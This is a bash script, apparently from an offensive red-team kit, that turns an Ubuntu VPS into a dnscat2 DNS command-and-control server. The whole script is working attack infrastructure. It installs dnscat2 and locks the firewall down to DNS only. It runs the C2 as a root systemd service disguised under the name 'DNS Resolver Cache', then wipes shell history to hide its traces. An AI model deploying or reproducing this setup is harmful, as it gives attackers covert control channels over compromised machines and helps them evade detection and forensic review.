#!/usr/bin/env bash
# ──── GHOST-HUNT // C2 KIT-DNS — DNS C2 Bootstrap (Playbook §12.2.2) ────
# One-shot server deployment. Run as root on Ubuntu 22.04+.
#   bash bootstrap-dns-server.sh [server-dns.env]
# Prerequisite: NS glue records for $DOMAIN already point at this VPS.
set -euo pipefail

# ── 0. Load config ───────────────────────────────────────────────────────────
ENV_FILE="${1:-server-dns.env}"
if [[ -f "$ENV_FILE" ]]; then
  set -a; source "$ENV_FILE"; set +a
else
  echo "[!] No env file at '$ENV_FILE' — relying on exported environment vars"
fi

: "${DOMAIN:?Set DOMAIN in $ENV_FILE (e.g. cdn-cache-xyz.com)}"
PORT="${PORT:-53}"

[[ $EUID -eq 0 ]] || { echo "[!] Run as root (sudo bash bootstrap-dns-server.sh ...)"; exit 1; }

echo "[*] Bootstrapping DNS C2 on $DOMAIN (port $PORT)"

# ── 1. Packages + dnscat2 ────────────────────────────────────────────────────
apt update -qq
DEBIAN_FRONTEND=noninteractive apt install -y -qq ruby ruby-dev build-essential ufw >/dev/null
gem install -q dnscat2

# gem bin paths vary across distros — resolve the binary explicitly
# (-print -quit avoids the find|head SIGPIPE false-failure under set -o pipefail)
DNSCAT2_BIN="$(command -v dnscat2 2>/dev/null \
  || find /var/lib/gems -name dnscat2 -type f -print -quit 2>/dev/null || true)"
[[ -n "$DNSCAT2_BIN" ]] || { echo "[!] dnscat2 binary not found after gem install"; exit 1; }

# ── 2. Firewall — DNS only ───────────────────────────────────────────────────
# `ufw reset` DISABLES the firewall, so stage the allow rules BEFORE `ufw
# enable` — after enable the box is deny-all the moment the script exits on
# error (only a failure inside the two commands between reset and enable
# could leave ufw off).
ufw --force reset >/dev/null
ufw allow "$PORT/udp" >/dev/null
ufw allow "$PORT/tcp" >/dev/null
ufw --force enable >/dev/null
ufw default deny incoming >/dev/null
ufw default allow outgoing >/dev/null

# ── 3. systemd — auto-start, masked as a resolver cache ──────────────────────
cat > /etc/systemd/system/dns-c2.service <<SVC
[Unit]
Description=DNS Resolver Cache
After=network.target

[Service]
Type=simple
ExecStart=$DNSCAT2_BIN --dns "domain=$DOMAIN,host=0.0.0.0,port=$PORT" --security=open --no-cache
Restart=always
RestartSec=5
# NOTE: must run as root — binding UDP/53 is a privileged port; User=nobody would crash-loop

[Install]
WantedBy=multi-user.target
SVC

systemctl daemon-reload
systemctl enable dns-c2 --now

# ── 4. OpSec ─────────────────────────────────────────────────────────────────
unset HISTFILE
history -c 2>/dev/null || true
rm -f ~/.bash_history

# ── 5. Banner ────────────────────────────────────────────────────────────────
echo ""
echo "╔══════════════════════════════════════╗"
echo "║  DNS C2 ACTIVE                      ║"
echo "╠══════════════════════════════════════╣"
echo "║  DOMAIN: $DOMAIN"
echo "║  IP:     $(curl -s --max-time 5 ifconfig.me || echo unknown)"
echo "║  STATUS: $(systemctl is-active dns-c2)"
echo "╚══════════════════════════════════════╝"
echo ""
echo "[!] REMEMBER: NS glue records must point at this VPS:"
echo "    ns1.$DOMAIN -> <this VPS IP>"
echo "    ns2.$DOMAIN -> <this VPS IP>"
echo "    Then:  dig @<this-VPS-IP> TXT test.$DOMAIN  # should reach dnscat2"
